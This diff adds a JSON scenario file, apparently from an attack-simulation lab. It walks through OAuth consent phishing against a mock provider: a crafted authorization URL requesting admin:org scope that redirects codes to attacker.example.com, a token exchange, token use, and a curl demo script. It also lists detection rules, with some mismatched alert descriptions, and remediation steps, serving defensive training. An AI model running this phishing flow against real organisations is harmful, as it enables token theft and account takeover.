@@ -1,0 +1,185 @@
+{
+  "id": "S6-01",
+  "name": "OAuth App Consent Phishing",
+  "category": "Infrastructure",
+  "version": "1.0",
+  "description": "Craft a malicious OAuth application requesting excessive permissions to phish consent from a victim. After consent, exchange the authorization code for an access token with admin:org scope.",
+  "difficulty": "Medium",
+  "real_world_relevance": "Nobelium/APT29 used malicious OAuth apps (2021). GitHub OAuth app abuse incidents. Microsoft Entra ID consent phishing campaigns.",
+
+  "mitre_attack": {
+    "tactics": ["Credential Access", "Initial Access"],
+    "techniques": [
+      {"id": "T1550.001", "name": "Use Alternate Authentication Material: Application Access Token"},
+      {"id": "T1566.002", "name": "Phishing: Spearphishing Link"}
+    ]
+  },
+
+  "prerequisites": {
+    "containers": ["cloud-workload"],
+    "network": "cloud_net",
+    "services": ["mock-oauth:8090"],
+    "permissions": "Network access to OAuth provider"
+  },
+
+  "attack_flow": {
+    "description": "Attacker creates malicious OAuth app, tricks victim into consenting to broad permissions, then exchanges the authorization code for an access token",
+    "diagram": [
+      "1. Attacker discovers OAuth provider via .well-known/openid-configuration",
+      "2. Attacker crafts consent URL with excessive scopes (admin:org, repo)",
+      "3. Victim clicks phishing link and approves on consent screen",
+      "4. Authorization code redirected to attacker's callback URL",
+      "5. Attacker exchanges code for access + refresh tokens",
+      "6. Attacker uses token to access org resources and repos"
+    ]
+  },
+
+  "phases": [
+    {
+      "name": "OAuth Discovery",
+      "description": "Enumerate OAuth provider capabilities and supported scopes",
+      "actions": [
+        {
+          "type": "http_request",
+          "method": "GET",
+          "target": "http://mock-oauth:8090/.well-known/openid-configuration",
+          "expected_output_contains": ["scopes_supported", "admin:org"],
+          "expected_status": 200
+        }
+      ]
+    },
+    {
+      "name": "Consent Phishing",
+      "description": "Craft malicious authorization URL requesting overprivileged scopes",
+      "critical": true,
+      "actions": [
+        {
+          "type": "http_request",
+          "method": "GET",
+          "target": "http://mock-oauth:8090/authorize?client_id=demo-malicious-app&scope=admin:org%20repo%20user:email&redirect_uri=https://attacker.example.com/callback&response_type=code",
+          "expected_output_contains": ["Authorize Application", "admin:org"],
+          "expected_status": 200,
+          "description": "Simulated consent screen with dangerous scope requests"
+        }
+      ]
+    },
+    {
+      "name": "Token Exchange",
+      "description": "Exchange stolen authorization code for access token",
+      "critical": true,
+      "actions": [
+        {
+          "type": "http_request",
+          "method": "POST",
+          "target": "http://mock-oauth:8090/oauth/token",
+          "body": "grant_type=authorization_code&code=demo_auth_code&client_id=demo-malicious-app&client_secret=demo-client-secret-FAKE",
+          "expected_output_contains": ["access_token", "refresh_token"],
+          "expected_status": 200
+        }
+      ]
+    },
+    {
+      "name": "Token Introspection",
+      "description": "Inspect stolen token to verify permissions obtained",
+      "actions": [
+        {
+          "type": "http_request",
+          "method": "POST",
+          "target": "http://mock-oauth:8090/oauth/token/introspect",
+          "body": "token=<stolen_access_token>",
+          "expected_output_contains": ["scope", "client_id"],
+          "expected_status": 200
+        }
+      ]
+    },
+    {
+      "name": "Identity Enumeration",
+      "description": "Use stolen token to enumerate victim identity and org membership",
+      "actions": [
+        {
+          "type": "http_request",
+          "method": "GET",
+          "target": "http://mock-oauth:8090/userinfo",
+          "headers": {"Authorization": "Bearer <stolen_access_token>"},
+          "expected_output_contains": ["org-admins", "admin"],
+          "expected_status": 200
+        }
+      ]
+    }
+  ],
+
+  "indicators_of_compromise": [
+    {
+      "type": "WebAccess",
+      "description": "OIDC discovery endpoint access (reconnaissance)",
+      "wazuh_rule": "100853"
+    },
+    {
+      "type": "WebAccess",
+      "description": "OAuth authorization with excessive scopes",
+      "wazuh_rule": "100907"
+    },
+    {
+      "type": "WebAccess",
+      "description": "Token exchange from suspicious source",
+      "wazuh_rule": "100907"
+    }
+  ],
+
+  "expected_wazuh_alerts": [
+    {
+      "rule_id": "100907",
+      "level": 10,
+      "description": "NHI: JWT token pattern detected"
+    },
+    {
+      "rule_id": "100853",
+      "level": 12,
+      "description": "NHI: AI agent SSRF - cloud metadata access"
+    }
+  ],
+
+  "remediation": {
+    "immediate": [
+      "Revoke all tokens issued to the malicious OAuth application",
+      "Disable the malicious OAuth app registration",
+      "Audit all actions performed with the stolen token"
+    ],
+    "long_term": [
+      "Implement admin consent workflow for sensitive scopes",
+      "Restrict which apps can request admin:org scope",
+      "Enable OAuth app whitelisting in the organization",
+      "Monitor for new OAuth app registrations",
+      "Train users to recognize consent phishing pages"
+    ]
+  },
+
+  "demo_script": {
+    "container": "cloud-workload",
+    "commands": [
+      "# Step 1: OIDC Discovery",
+      "curl -s http://mock-oauth:8090/.well-known/openid-configuration | python3 -m json.tool 2>/dev/null || echo 'OAuth provider not reachable'",
+      "",
+      "# Step 2: Simulate consent phishing URL",
+      "echo 'Phishing URL: http://mock-oauth:8090/authorize?client_id=demo-malicious-app&scope=admin:org+repo+user:email&redirect_uri=https://attacker.example.com/callback'",
+      "",
+      "# Step 3: Exchange code for token (simulated)",
+      "curl -s -X POST http://mock-oauth:8090/oauth/token -d 'grant_type=client_credentials&client_id=demo-malicious-app&client_secret=demo-client-secret-FAKE&scope=admin:org repo' 2>/dev/null | python3 -m json.tool || echo 'Token exchange failed'"
+    ]
+  },
+
+  "references": [
+    {
+      "title": "Nobelium OAuth Attack Campaign (Microsoft)",
+      "url": "https://www.microsoft.com/en-us/security/blog/2021/10/25/nobelium-targeting-delegated-administrative-privileges-to-facilitate-broader-attacks/"
+    },
+    {
+      "title": "MITRE ATT&CK T1550.001 - Application Access Token",
+      "url": "https://attack.mitre.org/techniques/T1550/001/"
+    },
+    {
+      "title": "OAuth 2.0 Threat Model (RFC 6819)",
+      "url": "https://datatracker.ietf.org/doc/html/rfc6819"
+    }
+  ]
+}
